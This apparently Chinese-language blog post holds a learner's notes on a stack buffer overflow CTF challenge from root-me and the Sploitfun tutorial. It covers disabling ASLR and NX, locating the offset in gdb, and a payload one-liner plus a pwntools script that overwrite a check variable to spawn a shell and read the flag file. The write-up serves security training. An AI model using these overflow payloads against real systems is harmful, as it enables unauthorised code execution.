@@ -1,0 +1,567 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.2.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16.png">
+  <link rel="mask-icon" href="/images/safari-pinned-tab.svg" color="#222">
+  <link rel="manifest" href="/images/site.webmanifest">
+  <meta name="msapplication-config" content="/images/browserconfig.xml">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.14.0/css/all.min.css">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css">
+
+<script class="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"finsenty54.github.io","root":"/","scheme":"Gemini","version":"8.0.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":false,"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}};
+  </script>
+
+  <meta name="description" content="Sploitfun-Classic Stack Based Buffer Overflowsudo bash -c &quot;echo 0 &gt; &#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;randomize_va_space&quot;关闭ASLR具体可见https:&#x2F;&#x2F;blog.csdn.net&#x2F;Plus_RE&#x2F;article&#x2F;details&#x2F;79199772 gcc  -pie      Cre">
+<meta property="og:type" content="article">
+<meta property="og:title" content="PWN keep going">
+<meta property="og:url" content="http://finsenty54.github.io/2020/11/10/PWN_keep_going/index.html">
+<meta property="og:site_name" content="FINSENTY54">
+<meta property="og:description" content="Sploitfun-Classic Stack Based Buffer Overflowsudo bash -c &quot;echo 0 &gt; &#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;randomize_va_space&quot;关闭ASLR具体可见https:&#x2F;&#x2F;blog.csdn.net&#x2F;Plus_RE&#x2F;article&#x2F;details&#x2F;79199772 gcc  -pie      Cre">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2020-11-10T01:33:50.000Z">
+<meta property="article:modified_time" content="2020-11-10T01:35:00.616Z">
+<meta property="article:author" content="finsenty54">
+<meta property="article:tag" content="PWN">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="canonical" href="http://finsenty54.github.io/2020/11/10/PWN_keep_going/">
+
+
+<script class="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>PWN keep going | FINSENTY54</title>
+  
+    <script async src="https://www.googletagmanager.com/gtag/js?id=UA-135283153-1"></script>
+    <script>
+      if (CONFIG.hostname === location.hostname) {
+        window.dataLayer = window.dataLayer || [];
+        function gtag(){dataLayer.push(arguments);}
+        gtag('js', new Date());
+        gtag('config', 'UA-135283153-1');
+      }
+    </script>
+
+
+
+
+
+
+  <noscript>
+  <style>
+  body { margin-top: 2rem; }
+
+  .use-motion .menu-item,
+  .use-motion .sidebar,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header {
+    visibility: visible;
+  }
+
+  .use-motion .header,
+  .use-motion .site-brand-container .toggle,
+  .use-motion .footer { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle,
+  .use-motion .custom-logo-image {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line {
+    transform: scaleX(1);
+  }
+
+  .search-pop-overlay, .sidebar-nav { display: none; }
+  .sidebar-panel { display: block; }
+  </style>
+</noscript>
+
+<link rel="alternate" href="/atom.xml" title="FINSENTY54" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <h1 class="site-title">FINSENTY54</h1>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">几处早莺争暖树，谁家新燕啄春泥。</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">15</span></a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类<span class="badge">0</span></a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">56</span></a>
+
+  </li>
+        <li class="menu-item menu-item-sitemap">
+
+    <a href="/sitemap.xml" rel="section"><i class="fa fa-sitemap fa-fw"></i>站点地图</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+        
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <section class="post-toc-wrap sidebar-panel">
+          <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Sploitfun-Classic-Stack-Based-Buffer-Overflow"><span class="nav-number">1.</span> <span class="nav-text">Sploitfun-Classic Stack Based Buffer Overflow</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ELF-x86-Stack-buffer-overflow-basic-1"><span class="nav-number">2.</span> <span class="nav-text">ELF x86 - Stack buffer overflow basic 1</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#64-Bits-Linux-Stack-Based-Buffer-Overflow"><span class="nav-number">2.1.</span> <span class="nav-text">64 Bits Linux Stack Based Buffer Overflow</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%9C%B0%E5%9D%80"><span class="nav-number">2.1.1.</span> <span class="nav-text">地址</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#leave%E5%92%8Cret"><span class="nav-number">2.1.2.</span> <span class="nav-text">leave和ret</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%B8%8D%E8%83%BD%E6%8E%A7%E5%88%B6RIP"><span class="nav-number">2.1.3.</span> <span class="nav-text">不能控制RIP</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%B0%8F%E7%AB%AF%E5%BA%8F"><span class="nav-number">2.1.4.</span> <span class="nav-text">小端序</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%B7%B3%E8%BD%AC%E5%88%B0%E7%94%A8%E6%88%B7%E6%8E%A7%E5%88%B6%E7%9A%84%E5%9C%B0%E5%9D%80"><span class="nav-number">2.1.5.</span> <span class="nav-text">跳转到用户控制的地址</span></a></li></ol></li></ol></li></ol></div>
+      </section>
+      <!--/noindex-->
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">finsenty54</p>
+  <div class="site-description" itemprop="description">blog</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">56</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">15</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/Finsenty54" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;Finsenty54" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:fin12138@gmail.com" title="E-Mail → mailto:fin12138@gmail.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+  <div class="cc-license animated" itemprop="license">
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
+  </div>
+
+
+
+      </section>
+    </div>
+  </aside>
+  <div class="sidebar-dimmer"></div>
+
+
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+    <div class="main-inner post posts-expand">
+      
+
+      
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://finsenty54.github.io/2020/11/10/PWN_keep_going/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="finsenty54">
+      <meta itemprop="description" content="blog">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="FINSENTY54">
+    </span>
+
+    
+    
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          PWN keep going
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2020-11-10 09:33:50 / 修改时间：09:35:00" itemprop="dateCreated datePublished" datetime="2020-11-10T09:33:50+08:00">2020-11-10</time>
+    </span>
+
+  
+    <span id="/2020/11/10/PWN_keep_going/" class="post-meta-item leancloud_visitors" data-flag-title="PWN keep going" title="阅读次数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-eye"></i>
+      </span>
+      <span class="post-meta-item-text">阅读次数：</span>
+      <span class="leancloud-visitors-count"></span>
+    </span>
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Valine：</span>
+    
+    <a title="valine" href="/2020/11/10/PWN_keep_going/#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/2020/11/10/PWN_keep_going/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <h2 id="Sploitfun-Classic-Stack-Based-Buffer-Overflow"><a href="#Sploitfun-Classic-Stack-Based-Buffer-Overflow" class="headerlink" title="Sploitfun-Classic Stack Based Buffer Overflow"></a>Sploitfun-Classic Stack Based Buffer Overflow</h2><p><code>sudo bash -c &quot;echo 0 &gt; /proc/sys/kernel/randomize_va_space&quot;</code><br>关闭ASLR<br>具体可见<a target="_blank" rel="noopener" href="https://blog.csdn.net/Plus_RE/article/details/79199772">https://blog.csdn.net/Plus_RE/article/details/79199772</a></p>
+<p><code>gcc  -pie      </code>Create a dynamically linked position independent executable.<br>Linux 平台通过 PIE 机制来负责代码段和数据段的随机化工作</p>
+<pre><code>gcc -g -fno-stack-protector -z execstack -o vuln vuln.c</code></pre>
+<a id="more"></a>
+<p>加上<code>-g</code>选项以后，gcc在编译是会做以下额外的操作：</p>
+<ol>
+<li>创建符号表，符号表包含了程序中使用的变量名称的列表。</li>
+<li>关闭所有的优化机制，以便程序执行过程中严格按照原来的C代码进行。</li>
+</ol>
+<p><code>-z execstack </code>禁用NX保护<br>详细的保护机制讲解<a target="_blank" rel="noopener" href="https://introspelliam.github.io/2017/09/30/pwn/linux%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%B8%B8%E7%94%A8%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/">https://introspelliam.github.io/2017/09/30/pwn/linux%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%B8%B8%E7%94%A8%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/</a></p>
+<p><code>gdb -q</code><br>  -q, –quiet, –silent<br>                     Do not print version number on startup.</p>
+<pre><code>gdb-peda$ r `python -c &#39;print &quot;A&quot;*300&#39;`
+
+gdb-peda$ help p</code></pre>
+<p>Print value of expression EXP.</p>
+<pre><code>gdb-peda$ p/x $rip</code></pre>
+<p><strong>这个教程太老了，还是32位上的</strong></p>
+<hr>
+<p>*经典root-me *</p>
+<h2 id="ELF-x86-Stack-buffer-overflow-basic-1"><a href="#ELF-x86-Stack-buffer-overflow-basic-1" class="headerlink" title="ELF x86 - Stack buffer overflow basic 1"></a>ELF x86 - Stack buffer overflow basic 1</h2><h3 id="64-Bits-Linux-Stack-Based-Buffer-Overflow"><a href="#64-Bits-Linux-Stack-Based-Buffer-Overflow" class="headerlink" title="64 Bits Linux Stack Based Buffer Overflow"></a>64 Bits Linux Stack Based Buffer Overflow</h3><h4 id="地址"><a href="#地址" class="headerlink" title="地址"></a>地址</h4><p> So memory addresses are <code>64 bits</code> long, but <code>user space </code>only uses<br>the <code>first 47 bits</code>; keep this in mind because if you specified an<br>address greater than<code> 0x00007fffffffffff</code>, you’ll raise an <code>exception</code>. So<br>that means that 0x4141414141414141 will raise exception, but the<br>address <code>0x0000414141414141</code> is safe. </p>
+<pre><code>64位下，用户空间只用低47位，所以不要超过0x00007fffffffffff</code></pre>
+<hr>
+<pre><code>$./vuln $(python -c &#39;print &quot;A&quot;*300&#39;)
+
+gdb-peda$ x/20xg $rsp</code></pre>
+<p><del>栈从高地址往低地址方向 扩展<br>溢出的时候，字符往高地址扩展</del></p>
+<hr>
+<h4 id="leave和ret"><a href="#leave和ret" class="headerlink" title="leave和ret"></a>leave和ret</h4><pre><code>leave = mov esp,ebp ; pop ebp
+ret = pop EIP</code></pre>
+<p>leave 执行后<br><code>指向返回地址</code><br>再<code> pop 将返回地址赋给 EIP</code></p>
+<h4 id="不能控制RIP"><a href="#不能控制RIP" class="headerlink" title="不能控制RIP"></a>不能控制RIP</h4><p>So the program ends and we’re not able to control RIP:( Why?Because we  <code> override   too   much   bits</code>,   remember   biggest   address   is 0x00007fffffffffff and we try to overflow using 0x4141414141414141</p>
+<p>de08-dd00=0x108  ==264</p>
+<h4 id="小端序"><a href="#小端序" class="headerlink" title="小端序"></a>小端序</h4><pre><code>gdb-peda$ r $(python -c &#39;print &quot;A&quot;*264+&quot;B&quot;*6&#39;)</code></pre>
+<p><del>ASLR 开起来了</del></p>
+<p>输入是”A”*264+”ABCDEF”</p>
+<pre><code>0x7fffffffde28:    0x41    0x42    0x43    0x44    0x45    0x46    0x00    0x00</code></pre>
+<p>是<code>按序</code>填充的</p>
+<p><strong>但有因为小端序，所以又倒序读入RIP</strong><br><code>RIP: 0x464544434241 (&#39;ABCDEF&#39;)</code></p>
+<hr>
+<h4 id="跳转到用户控制的地址"><a href="#跳转到用户控制的地址" class="headerlink" title="跳转到用户控制的地址"></a>跳转到用户控制的地址</h4><p><em>（显然没有开NX）</em></p>
+<pre><code>&quot;A&quot; * 264 + &quot;\x7f\xff\xff\xff\xdc\x90&quot;[::-1]</code></pre>
+<p><code>0x7fffffffdc90</code>buf在栈中开始地址</p>
+<p>We  need  to  reverse the  memory  address  because  it’s  a <code> little  endian architecture</code>. That’sexactly what<code>[::-1]</code>does in python.<br>[::-1]逆序</p>
+<hr>
+<p>本题考察了Unix基本输入输出流与缓冲</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">int</span> var;</span><br><span class="line">  <span class="keyword">int</span> check = <span class="number">0x04030201</span>;</span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">40</span>];</span><br><span class="line"> </span><br><span class="line">  fgets(buf,<span class="number">45</span>,<span class="built_in">stdin</span>);</span><br><span class="line"> </span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n[buf]: %s\n&quot;</span>, buf);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[check] %p\n&quot;</span>, check);</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">if</span> ((check != <span class="number">0x04030201</span>) &amp;&amp; (check != <span class="number">0xdeadbeef</span>))</span><br><span class="line">    <span class="built_in">printf</span> (<span class="string">&quot;\nYou are on the right way!\n&quot;</span>);</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">if</span> (check == <span class="number">0xdeadbeef</span>)</span><br><span class="line">   &#123;</span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">&quot;Yeah dude! You win!\nOpening your shell...\n&quot;</span>);</span><br><span class="line">     setreuid(geteuid(), geteuid());</span><br><span class="line">     system(<span class="string">&quot;/bin/bash&quot;</span>);</span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">&quot;Shell closed! Bye.\n&quot;</span>);</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>标准输入后，还会跟上’\r\n’<br>fgets()读取45-1个字节，或者遇到’\n’停止<br>所以只是溢出4个字节即可，覆盖掉<code>check</code><br><code>0xdeadbeef</code>还需要逆序</p>
+<p><del>但我不知道unix的输入输出流</del><br>payload:(python -c ‘print “a”*40+”DEADBEEF”.decode(“hex”)[::-1]’;cat) | ./ch13<br>得到shell后：<code>cat .passwd</code></p>
+<hr>
+<p>别人使用脚本编写的</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># solution by MtucX</span></span><br><span class="line"># Require pwntools</span><br><span class="line">from pwn <span class="keyword">import</span> *</span><br><span class="line"> </span><br><span class="line">pwn_socket=ssh(host=&#x27;challenge02.root-me.org&#x27; ,user=&#x27;app-systeme-ch13&#x27; ,password=&#x27;app-systeme-ch13&#x27;,port=2222)</span><br><span class="line">pwned=pwn_socket.process(executable=&#x27;./ch13&#x27;)</span><br><span class="line">pwned.sendline(&#x27;A&#x27; * 40  + &#x27;\xef\xbe\xad\xde&#x27;)</span><br><span class="line">pwned.sendline(&#x27;cat .passwd&#x27;)</span><br><span class="line">pwned.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          
+
+<div class="post-copyright">
+<ul>
+  <li class="post-copyright-author">
+      <strong>本文作者： </strong>finsenty54
+  </li>
+  <li class="post-copyright-link">
+      <strong>本文链接：</strong>
+      <a href="http://finsenty54.github.io/2020/11/10/PWN_keep_going/" title="PWN keep going">http://finsenty54.github.io/2020/11/10/PWN_keep_going/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+          
+
+  <div class="followme">
+    <span>欢迎关注我的其它发布渠道</span>
+
+    <div class="social-list">
+
+        <div class="social-item">
+          <a target="_blank" class="social-link" href="/atom.xml">
+            <span class="icon">
+              <i class="fa fa-rss"></i>
+            </span>
+
+            <span class="label">RSS</span>
+          </a>
+        </div>
+    </div>
+  </div>
+
+          <div class="post-tags">
+              <a href="/tags/PWN/" rel="tag"># PWN</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2020/10/31/ELF%20x64%20-%20Nanomites%20-%20Introduction_WP/" rel="prev" title="ELF x64 - Nanomites - Introduction_WP">
+                  <i class="fa fa-chevron-left"></i> ELF x64 - Nanomites - Introduction_WP
+                </a>
+            </div>
+            <div class="post-nav-item">
+            </div>
+          </div>
+    </footer>
+  </article>
+  
+  
+  
+
+
+
+      
+    <div class="comments" id="valine-comments"></div>
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      const activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      const commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+    </div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+      
+
+      
+
+<div class="copyright">
+  
+  &copy; 2019 – 
+  <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">finsenty54</span>
+</div>
+<div class="busuanzi-count">
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <script src="//cdn.jsdelivr.net/npm/animejs@3.2.0/lib/anime.min.js"></script>
+<script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+
+
+
+
+  
+
+  
+<script>
+NexT.utils.loadComments('#valine-comments', () => {
+  NexT.utils.getScript('//cdn.jsdelivr.net/npm/valine@1.4.14/dist/Valine.min.js', () => {
+    new Valine(Object.assign({
+      el  : '#valine-comments',
+      path: "/2020/11/10/PWN_keep_going/",
+    }, {"enable":true,"appId":"3uGsbMNvxiG0LkbyciDSaxmY-MdYXbMMI","appKey":"1dU1y3SudPaV6pdTET96j5M2","placeholder":"欢迎交流讨论...","avatar":"mm","meta":["nick","mail","link"],"pageSize":10,"lang":"zh-cn","visitor":true,"comment_count":true,"recordIP":false,"serverURLs":null,"enableQQ":false,"requiredFields":[]}
+    ));
+  }, window.Valine);
+});
+</script>
+
+</body>
+</html>
